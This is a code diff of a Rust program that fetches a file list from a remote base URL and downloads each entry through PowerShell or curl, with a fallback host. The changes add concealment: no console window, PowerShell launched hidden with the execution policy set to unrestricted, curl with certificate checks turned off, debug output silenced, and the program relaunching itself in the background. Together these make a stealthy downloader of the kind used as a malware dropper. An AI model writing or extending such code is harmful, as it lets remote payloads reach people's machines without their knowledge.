@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows" ]
 use lazy_static::lazy_static;
 use std::env;
 use std::fs::read_to_string;
@@ -21,16 +22,16 @@ where
 {
     // let mut dst_uri = format!("C:\\tmp\\{}", dst);
     let mut dst_path = TEMP_DIR.clone();
-    dst_path.push(dst);
-    let dst_uri = dst_path.to_str().expect("no").to_string();
+    dst_path.push(dst.trim());
+    let dst_uri = dst_path.to_str().expect("no").trim().to_string();
     let _ = if cfg!(target_os = "windows") {
         let wincmd = format!(
             "$client = new-object System.Net.WebClient;$client.DownloadFile(\"{}\",\"{}\");",
-            url, dst_uri
+            url.trim(), dst_uri
         );
-        println!("Run : {}", wincmd);
+        // println!("Run : {}", wincmd);
         let mut process = Command::new("powershell")
-            .args(&["-Command", "-"])
+            .args(&["-NoProfile", "-ExecutionPolicy", "unrestricted","-windowstyle","hidden","-Command", "-"])
             .stdin(Stdio::piped())
             .spawn()?;
         let stdin = process.stdin.as_mut().expect("pipe failure");
@@ -38,23 +39,37 @@ where
             .write_all(wincmd.as_bytes())
             .expect("ps downlaod error");
         match process.wait() {
-            Ok(code) => { println!("{} {}","hear but code:", code)}
+            Ok(code) => { 
+                if code.code() != Some(0){
+                    let f_names = url.split("/").collect::<Vec<_>>();
+                    let f_name = f_names.last().unwrap();
+                    println!("[err] try route2: {} ",url.trim());
+                    download(&format!("{}{}", BASE2, f_name), dst, after)?;
+                }else{
+                    println!("[ok] downlod file: {} ",dst.trim());
+                }
+            },
             Err(_) => {
-                let f_names = url.split("/").collect::<Vec<_>>();
-                let f_name = f_names.last().unwrap();
-
-                download(&format!("{}{}", BASE2, f_name), dst, after);
+                
             }
         }
     } else {
         // dst_uri = format!("/tmp/{}", dst);
         let cmd = format!("curl -ksSl '{}' -o '{}' ;", url, dst_uri);
-        println!("{}", cmd);
-        Command::new("bash")
+        // println!("{}", cmd);
+        let c = Command::new("bash")
             .arg("-c")
             .arg(cmd)
             .output()
             .expect("may wget error ");
+        if c.status.code() != Some(0){
+            let f_names = url.split("/").collect::<Vec<_>>();
+            let f_name = f_names.last().unwrap();
+            println!("[err] try route2: {} ",url.trim());
+            download(&format!("{}{}", BASE2, f_name), dst, after)?;
+        }else{
+            println!("[ok] downlod file: {} ",dst.trim());
+        }
     };
     if let Some(after_fun) = after {
         after_fun(&dst_uri);
@@ -65,7 +80,7 @@ where
 }
 
 fn after_dosome(some: &str) {
-    println!("{} [ok]", some)
+    println!("[done] {}", some)
 }
 
 fn read_index(filepath: &str) {
@@ -83,7 +98,7 @@ fn read_index(filepath: &str) {
                 .iter()
                 .map(|&each_name| {
                     if each_name.trim() != "" {
-                        println!("found new file to donwload: {}", each_name);
+                        println!("    [+] need to donwload: {}", each_name.trim());
                         let _ = download(
                             &format!("{}{}", BASE, each_name),
                             each_name,
@@ -97,12 +112,54 @@ fn read_index(filepath: &str) {
     };
 }
 
+fn background(runner :&str) -> Out<()>{
+    
+    let wincmd = format!("{} f", runner);
+    if cfg!( target_os="windows" ){
+        let mut process = Command::new("powershell")
+            .args(&["-Command", "-"])
+            .stdin(Stdio::piped())
+            .spawn().expect("some error for initialization powershell");
+        let stdin = process.stdin.as_mut().expect("pipe failure");
+        stdin
+            .write_all(wincmd.clone().as_bytes()).expect("interact ps error!");
+    }else{
+        Command::new("bash")
+            .arg("-c")
+            .arg(&wincmd)
+            .spawn().expect("linux initializaltion err");
+            // process.spawn();
+    }
+
+    Ok(())
+}
+
 fn main() -> Out<()> {
-    download(
-        &format!("{}{}", BASE, "index.list"),
-        "index.list",
-        Some(read_index),
-    )
+    let mut run_foreground = false;
+    let mut c = 0;
+    let mut runner:String = String::from("");
+    for arg in env::args(){
+        if c ==0 {
+            runner = arg.clone();
+        }
+        if arg == "f"{
+            download(
+                &format!("{}{}", BASE, "index.list"),
+                "index.list",
+                Some(read_index),
+            )?;
+            run_foreground = true;
+        }
+        c+=1;
+    }
+    if !run_foreground && &runner != ""{
+        println!("ready background!");
+        background(&runner).expect("run backgroun err!");
+        Ok(())
+    }else{
+        Ok(())
+    }
+    
     // sync post request of some json.
-    // Ok(())
+
 }
